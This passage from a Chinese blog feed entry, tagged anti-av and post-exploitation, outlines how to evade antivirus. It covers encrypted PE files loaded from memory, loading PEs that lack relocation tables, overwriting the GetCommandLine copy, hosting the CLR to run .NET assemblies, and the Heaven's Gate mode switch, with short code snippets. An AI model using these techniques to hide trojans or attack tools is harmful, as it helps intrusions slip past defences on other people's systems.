&lt;h2 id=&quot;天堂之门-从32位到64位&quot;&gt;天堂之门 从32位到64位&lt;/h2&gt;

&lt;p&gt;x64构架的cpu使用cs段寄存器来确定cpu的运行模式。在32位进程中，cs=0x23；在64位进程中，cs=0x33。当cs被更改后，cpu的运行模式便会发生转变。由此产生一种技术，天堂之门（Heaven’s Gate），通过改变段寄存器来实现32位与64位代码的转换。&lt;/p&gt;

&lt;pre&gt;&lt;code class=&quot;language-asm&quot;&gt;push 33h //将0x33压栈
push 64bit_code_address //将64bit的代码地址压栈
reft //模式转换
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;其中reft指令又叫far ret，是带有段寄存器的返回，它会从栈中弹出两个值，一个给cs，一个给ip，因此在reft执行后，cpu将按照64位模式继续执行64位代码。&lt;/p&gt;

&lt;h1 id=&quot;小结&quot;&gt;小结&lt;/h1&gt;

&lt;p&gt;这算是我这段时期学习免杀的一个总结，尽管本文探讨的技术都十分古老，但放到现在仍旧值得我们去学习。&lt;/p&gt;

&lt;h1 id=&quot;引用&quot;&gt;引用&lt;/h1&gt;

&lt;p&gt;&lt;a href=&quot;https://www.codeproject.com/Articles/607352/Injecting-Net-Assemblies-Into-Unmanaged-Processes&quot;&gt;https://www.codeproject.com/Articles/607352/Injecting-Net-Assemblies-Into-Unmanaged-Processes&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;a href=&quot;https://medium.com/@fsx30/hooking-heavens-gate-a-wow64-hooking-technique-5235e1aeed73&quot;&gt;https://medium.com/@fsx30/hooking-heavens-gate-a-wow64-hooking-technique-5235e1aeed73&lt;/a&gt;&lt;/p&gt;</content><author><name></name></author><category term="anti-av" /><category term="post-exploition" /><summary type="html">在进行后渗透阶段的过程中，首先要面临的问题就是免杀。如果服务器安装了反病毒软件，那不管是用马进行权限维持还是上传提权exp进行提权，甚至使用一些隧道工具（如ew）都将都到影响。如果是使用msf/cs等工具可以使用加载shellcode的方式进行免杀，但是涉及到一些常用工具的免杀就需要用修改源码、修改特征码的方式进行处理。这种处理不但烦琐而且不具有通用性，因此开发一种通用的工具来进行免杀是必要的。 本文将只探讨思路，不涉及具体实现。 特征码技术与免杀 特征码技术：运用程序中某一段或几段64字节以下的代码作为判别程序病毒的主要依据 谈到杀毒软件就不得不说特征码技术，尽管历史悠久，但到目前为止仍是各大杀毒软件判断可执行程序的主要手段。shellcode分离免杀之所以能获得很好的效果就是因为shellcode加载器本身并不包含恶意代码，自然也不会包含恶意软件的特征码，而只有当加载器运行时，它才会从程序之外加载shellcode执行。 借鉴shellcode分离免杀的思路，如果将pe文件以加密的形式存储，使用加载器读取pe文件并解密，最后放到内存中执行，那么程序的免杀性将大大地提高。实际上类似的技术早在至少08年就被提出过，叫做反射型dll注入（reflective dll injection），通过内存而不是从磁盘上加载dll。要实现从内存加载可执行程序并不困难，只要了解操作系统如何将exe加载到内存并编程重新实现就可以了。 实现原理 exe程序被执行的过程： windows pe loader读取pe文件，检查pe文件的有效性。 根据pe文件头中的IMAGE_OPTIONAL_HEADER.SizeOfImage申请一块空间 pe loader将pe文件按IMAGE_OPTIONAL_HEADER.SectionAlignment展开，将pe文件装载到内存空间。 根据pe文件的导入表，pe loader将pe所需要的dll加载进地址空间并更新IAT 如果没有加载在pe文件中设定的ImageBase，需要使用重定位表进行重定位 跳到pe入口点 基本上只要实现了上述几个步骤就可以实现内存加载，但是具体实现的时候我还遇到了几个问题： 如果PE文件不存在重定位表，应该如何加载 如何修改传给被加载程序的参数 如何加载.Net PE 如何加载x64程序 加载无重定位表的PE 关于重定位表： 当加载器加载程序时，如果加载器为某PE（.exe、.dll）分配的基址与其自身默认记录的ImageBase不相同，那么该程序文件加载完毕后就需要修正重定位表中的所有需要修正的地址。如果加载器分配的基址和该程序文件中记录默认的ImageBase相同，则不需要修正，重定位表对于该dll也是没有效用的。 因此如果将PE加载在默认的位置则可以无需重定位表。我们将加载器的ImageBase设为其他地址，为没有重定位表的pe程序让出空间，随后用virtualloc在目标pe程序的默认基址处开辟一块内存用来放置目标pe程序，这样就可以避免考虑重定位的问题。 修改传递给被加载程序的命令行参数 我对加载器的设想是传递一个目标pe文件路径参数给加载器，然后加载器通过路径进行加载。如果只是加载一些木马就不需要考虑命令行参数的问题，但是如果要加载一些工具那传递给加载器的参数就会污染传递给被加载pe文件的参数，因此需要考虑参数传递的问题。 一个进程如何获得命令行参数 一般进程获取到命令行参数的方法是通过windows api的GetCommandLine获取 LPSTR GetCommandLineA(); LPWSTR GetCommandLineW(); 有一个误区是很多人认为这个函数是从进程peb中获取到的参数，但实际上系统在加载进程时保存了一份命令行参数的拷贝在某个私有变量中，GetCommandLine都是从那个拷贝中获取，因此只有修改了拷贝的地址中的内容才有效。 示例代码 LPWSTR pCommandLine = GetCommandLineW(); LPSTR pCommandLineA = GetCommandLineA(); strcpy(pCommandLineA, arguments.c_str()); int maxCount = lstrlenW(pCommandLine); size_t converted = 0; mbstowcs_s(&amp;amp;converted, pCommandLine, arguments.length() + 1, arguments.c_str(), maxCount); 如何加载.Net程序 PE实际上只是一种存储数据的方式，尽管都是PE文件，但是.Net程序与Win32程序还是有着本质的区别。要了解.Net，还要从CLR说起。 Common Language Runtime The Common Language Runtime (CLR) is a complete, high level virtual machine designed to support a broad variety of programming languages and interoperation among them. 公共语言运行时（CLR）是一套完整的、高级的虚拟机，它被设计为用来支持不同的编程语言，并支持它们之间的互操作。 正如 JRE 是 JAVA 的运行环境一样，CLR是.Net的运行环境，不同的是它可以为多种语言提供支持。 著名的.Net体系 .Net程序经过编译器编译后，会生成一种中间语言——MSIL，执行时CLR再将他们翻译为真正的机器语言执行。因此我们不能像处理Win32程序一样处理.Net程序，而需要与CLR进行交互，将.Net程序交给CLR去执行。 示例代码 加载.Net环境并执行.Net程序的代码很多，以下代码只是示范 HRESULT hr; ICLRMetaHost *pMetaHost = NULL; ICLRRuntimeInfo *pRuntimeInfo = NULL; ICLRRuntimeHost *pClrRuntimeHost = NULL; // build runtime hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&amp;amp;pMetaHost)); hr = pMetaHost-&amp;gt;GetRuntime(L&quot;v4.0.30319&quot;, IID_PPV_ARGS(&amp;amp;pRuntimeInfo)); hr = pRuntimeInfo-&amp;gt;GetInterface(CLSID_CLRRuntimeHost, IID_PPV_ARGS(&amp;amp;pClrRuntimeHost)); // start runtime hr = pClrRuntimeHost-&amp;gt;Start(); // execute managed assembly DWORD pReturnValue; hr = pClrRuntimeHost-&amp;gt;ExecuteInDefaultAppDomain( L&quot;T:\\FrameworkInjection\\_build\\debug\\anycpu\\InjectExample.exe&quot;, L&quot;InjectExample.Program&quot;, L&quot;EntryPoint&quot;, L&quot;hello .net runtime&quot;, &amp;amp;pReturnValue); // free resources pMetaHost-&amp;gt;Release(); pRuntimeInfo-&amp;gt;Release(); pClrRuntimeHost-&amp;gt;Release(); 加载x64程序 如果要图方便的话只要稍微修改一下代码重新编译一个x64的加载器就可以（事实上我就是这样做的），但如果我们追求极致，想让我们的加载器做到能同时加载32位和64位程序呢？理论上讲，如果我们的程序是32位的，那就没法执行64位的cpu指令，如果是64位的，同样也无法执行32位的cpu指令。想要实现在32位指令与64位指令的切换，就需要了解当我们在64位操作系统下执行了32位程序时，操作系统都做了哪些工作。 Windows x64下的Win32程序 在64位系统，任何进程中首先执行的代码是64位的ntdll.dll，它会初始化一个64位的进程。而稍后32位的应用程序将运行在一个名为WoW64的子系统下（说到子系统有没有想到WSL），这个子系统加载32位的ntdll.dll，将cpu转换为32位模式以执行Win32程序中的代码。 在x64系统下观察一个Win32程序，发现会同时加载了两个ntdll.dll，其中有一个处在64位的地址空间，这就是64位的ntdll.dll。32位的ntdll.dll并没有包含任何sysenter的指令，因此当Win32程序尝试通过32位的ntdll.dll与系统交互时，32位的ntdll.dll将参数转发给64位的ntdll.dll并再一次进行cpu的模式转换，回到64位完成这次系统调用。 可以看到，在启动程序与系统调用的过程中，cpu分别发生了64到32与32到64两种转换，如果我们手动实现这一过程，那么我们的程序也可以在32位与64位指令中进行切换。 天堂之门 从32位到64位 x64构架的cpu使用cs段寄存器来确定cpu的运行模式。在32位进程中，cs=0x23；在64位进程中，cs=0x33。当cs被更改后，cpu的运行模式便会发生转变。由此产生一种技术，天堂之门（Heaven’s Gate），通过改变段寄存器来实现32位与64位代码的转换。 push 33h //将0x33压栈 push 64bit_code_address //将64bit的代码地址压栈 reft //模式转换 其中reft指令又叫far ret，是带有段寄存器的返回，它会从栈中弹出两个值，一个给cs，一个给ip，因此在reft执行后，cpu将按照64位模式继续执行64位代码。 小结 这算是我这段时期学习免杀的一个总结，尽管本文探讨的技术都十分古老，但放到现在仍旧值得我们去学习。 引用 https://www.codeproject.com/Articles/607352/Injecting-Net-Assemblies-Into-Unmanaged-Processes https://medium.com/@fsx30/hooking-heavens-gate-a-wow64-hooking-technique-5235e1aeed73</summary></entry></feed>